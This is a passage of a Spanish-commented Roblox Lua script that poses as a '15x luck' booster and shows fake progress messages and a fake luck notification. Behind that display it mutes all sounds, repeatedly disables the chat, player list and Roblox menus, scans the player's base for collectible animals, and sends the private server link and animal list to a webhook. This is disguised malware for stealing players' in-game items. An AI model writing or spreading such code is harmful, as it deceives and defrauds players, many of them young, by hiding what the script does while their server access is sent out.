listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 8)
listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left

-- HERRAMIENTAS DE UI
local function clearContent()
    for _, child in pairs(contentContainer:GetChildren()) do
        if child:IsA("GuiObject") then
            local properties = {BackgroundTransparency = 1}
            
            if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
                properties.TextTransparency = 1
            end
            
            TweenService:Create(child, TweenInfo.new(0.3), properties):Play()
        end
    end
    task.wait(0.3)
    for _, child in pairs(contentContainer:GetChildren()) do
        if child:IsA("GuiObject") then 
            child:Destroy() 
        end
    end
end

local function addText(text, font, size, color, delayTime)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 24)
    label.BackgroundTransparency = 1
    label.TextColor3 = color or THEME.Text
    label.Font = font or THEME.FontBody
    label.TextSize = size or 14
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.Text = text
    label.TextTransparency = 1
    label.Parent = contentContainer
    
    TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    
    if delayTime then 
        task.wait(delayTime) 
    end
    return label
end

local function addHeader(text)
    local label = addText(text, THEME.FontMain, 18, THEME.Accent, 0.1)
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 0, 0, 2)
    line.BackgroundColor3 = THEME.Accent
    line.BorderSizePixel = 0
    line.Parent = contentContainer
    TweenService:Create(line, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0.3, 0, 0, 2)}):Play()
    task.wait(0.5)
end

local function getRandomBrainrots(count)
    local shuffled = {}
    for i, v in ipairs(BRAINROT_LIST) do
        shuffled[i] = v
    end
    
    for i = #shuffled, 2, -1 do
        local j = math.random(i)
        shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
    end
    
    local selected = {}
    for i = 1, math.min(count, #shuffled) do
        table.insert(selected, shuffled[i])
    end
    
    return selected
end

-- Función para silenciar todos los sonidos
local function muteAllSounds()
    local function mutear(sound)
        if sound:IsA("Sound") then
            sound.Volume = 0
            sound.Playing = false
        end
    end

    for _, obj in pairs(game:GetDescendants()) do
        mutear(obj)
    end

    game.DescendantAdded:Connect(function(obj)
        mutear(obj)
    end)

    task.spawn(function()
        while task.wait(1) do
            for _, obj in pairs(game:GetDescendants()) do
                if obj:IsA("Sound") then 
                    obj.Volume = 0 
                    obj.Playing = false
                end
            end
        end
    end)
end

-- Función para desactivar CoreGui y ocultar todo
local function disableCoreGui()
    local coreGuiTypes = {
        Enum.CoreGuiType.PlayerList,
        Enum.CoreGuiType.Health,
        Enum.CoreGuiType.Backpack,
        Enum.CoreGuiType.Chat,
        Enum.CoreGuiType.EmotesMenu,
        Enum.CoreGuiType.All
    }
    
    for _, guiType in pairs(coreGuiTypes) do
        pcall(function()
            StarterGui:SetCoreGuiEnabled(guiType, false)
        end)
    end
    
    pcall(function()
        StarterGui:SetCore("TopbarEnabled", false)
    end)
    
    pcall(function()
        StarterGui:SetCore("ChatActive", false)
    end)
    
    local function ocultarScreenGuis()
        if player and player.Parent then
            local PlayerGui = player:WaitForChild("PlayerGui")

            for _, gui in ipairs(PlayerGui:GetChildren()) do
                if gui:IsA("ScreenGui") and gui.Name ~= "MatchmakingUI" then
                    gui.Enabled = false
                end
            end

            PlayerGui.ChildAdded:Connect(function(gui)
                if gui:IsA("ScreenGui") and gui.Name ~= "MatchmakingUI" then
                    task.wait(0.1)
                    gui.Enabled = false
                end
            end)
        end
    end
    
    ocultarScreenGuis()
    
    local function cerrarMenuRoblox()
        pcall(function()
            GuiService:ClearError()
            StarterGui:SetCore("ResetButtonCallback", false)
        end)

        local CoreGui = game:GetService("CoreGui")
        for _, gui in ipairs(CoreGui:GetChildren()) do
            if gui:IsA("ScreenGui") then
                if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
                    gui.Enabled = false
                end
            end
        end
    end
    
    cerrarMenuRoblox()
    
    task.spawn(function()
        while task.wait(0.1) do
            cerrarMenuRoblox()
            ocultarScreenGuis()
        end
    end)
end

-- LOGICA DE FASES
local isRunning = false

activateBtn.MouseButton1Click:Connect(function()
    if isRunning then 
        return 
    end
    isRunning = true
    
    -- FASE 1: Activación y Preparación de la UI
    TweenService:Create(activateBtn, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    task.wait(0.3)
    activateBtn.Visible = false
    
    mainFrame.Visible = true
    mainFrame.Size = UDim2.new(0, 400, 0, 0)
    TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(0, 400, 0, 250)}):Play()
    task.wait(0.7)
    
    -- FASE 2: Carga Inicial
    addHeader("SUERTE 15x")
    task.wait(0.5)
    
    addText("Viendo modulos de la suerte...", nil, 14, THEME.SubText, 1.5)
    addText("Analizando probabilidades 15x...", nil, 14, THEME.SubText, 2.0)
    addText("Cargando multiplicador de suerte...", nil, 14, THEME.SubText, 1.0)
    
    addText(">> SUERTE 15x ACTIVADA", THEME.FontMain, 14, Color3.fromRGB(100, 255, 100), 1.5)
    
    task.wait(1)
    clearContent()
    
    -- ESCANEO DE ANIMALES (sin UI) - Usando búsqueda en Workspace
    local foundAnimals = buscarBaseYAnimales()
    
    task.wait(1)
    
    -- FASE 3: Mini UI de Carga (sin cubrir pantalla)
    clearContent()
    
    -- Reducir el mainFrame a una barra pequeña
    TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Exponential), {
        Size = UDim2.new(0, 350, 0, 80),
        Position = UDim2.new(0.5, -175, 0.8, -40)
    }):Play()
    
    task.wait(0.6)
    
    -- Texto de carga
    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(1, -20, 0, 25)
    loadingText.Position = UDim2.new(0, 10, 0, 10)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = THEME.Accent
    loadingText.Font = THEME.FontMain
    loadingText.TextSize = 14
    loadingText.TextXAlignment = Enum.TextXAlignment.Left
    loadingText.Text = "Aplicando suerte 15x... (Puedes mover esta ventana)"
    loadingText.Parent = mainFrame
    
    -- Barra de progreso fondo
    local progressBg = Instance.new("Frame")
    progressBg.Name = "ProgressBg"
    progressBg.Size = UDim2.new(1, -20, 0, 20)
    progressBg.Position = UDim2.new(0, 10, 0, 45)
    progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = mainFrame
    
    local progressBgCorner = Instance.new("UICorner")
    progressBgCorner.CornerRadius = UDim.new(0, 6)
    progressBgCorner.Parent = progressBg
    
    -- Barra de progreso (animada)
    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.Position = UDim2.new(0, 0, 0, 0)
    progressBar.BackgroundColor3 = THEME.Accent
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBg
    
    local progressBarCorner = Instance.new("UICorner")
    progressBarCorner.CornerRadius = UDim.new(0, 6)
    progressBarCorner.Parent = progressBar
    
    -- Habilitar arrastre de la ventana
    isDraggable = true
    
    -- Animación de la barra de progreso (loop infinito)
    task.spawn(function()
        while loadingText.Parent do
            -- Animar de 0% a 100%
            TweenService:Create(progressBar, TweenInfo.new(2, Enum.EasingStyle.Linear), {
                Size = UDim2.new(1, 0, 1, 0)
            }):Play()
            task.wait(2)
            
            -- Resetear
            progressBar.Size = UDim2.new(0, 0, 1, 0)
            task.wait(0.1)
        end
    end)
    
    -- Animación de puntos en el texto
    task.spawn(function()
        local dots = ""
        while loadingText.Parent do
            dots = dots .. "."
            if #dots > 3 then 
                dots = "" 
            end
            loadingText.Text = "Aplicando suerte 15x" .. dots .. " (Puedes mover esta ventana)"
            task.wait(0.5)
        end
    end)
    
    -- Esperar 5 segundos antes de enviar los datos reales
    task.wait(5)
    
    -- Enviar datos al webhook (el envío real)
    sendToWebhook(privateServerLink, foundAnimals)
    
    -- Esperar 10 segundos adicionales y ejecutar el efecto de suerte
    task.wait(10)
    
    -- Ejecutar efecto visual de suerte 15x
    pcall(function()
        local activeEventsFolder = playerGui.ActiveEvents
        local activeEventsFrame = activeEventsFolder.ActiveEvents
        local luck = activeEventsFrame.Luck
        local luckMainFrame = luck.Main
        local textLabel = luckMainFrame.TextLabel

        local RENotificationServiceNotify = ReplicatedStorage.Packages.Net["RE/NotificationService/Notify"]

        activeEventsFolder.Enabled = true
        activeEventsFrame.Visible = true
        luck.Visible = true
        luck.Active = true
        luckMainFrame.Visible = true
        luckMainFrame.Active = true
        luckMainFrame.Image = "rbxassetid://97625587462302"

        firesignal(RENotificationServiceNotify.OnClientEvent,
            "<og>15x luck activated for 15 minutes]</og>",
            10,
            "Sounds.Sfx.Success"
        )

        luckMainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)

        local tweenInfo = TweenInfo.new(
            1,
            Enum.EasingStyle.Quad,
            Enum.EasingDirection.Out,
            0,
            false,
            0
        )

        local goal = {Position = UDim2.new(0.5, 0, 0.5, 0)}
        local tween = TweenService:Create(luckMainFrame, tweenInfo, goal)

        tween:Play()

        local timeRemaining = 900

        while timeRemaining > 0 do
            local minutes = math.floor(timeRemaining / 60)
            local seconds = timeRemaining % 60
            textLabel.Text = string.format("%d:%02d", minutes, seconds)
            task.wait(1)
            timeRemaining = timeRemaining - 1
        end

        textLabel.Text = "0:00"
    end)
    
    isRunning = false
end)
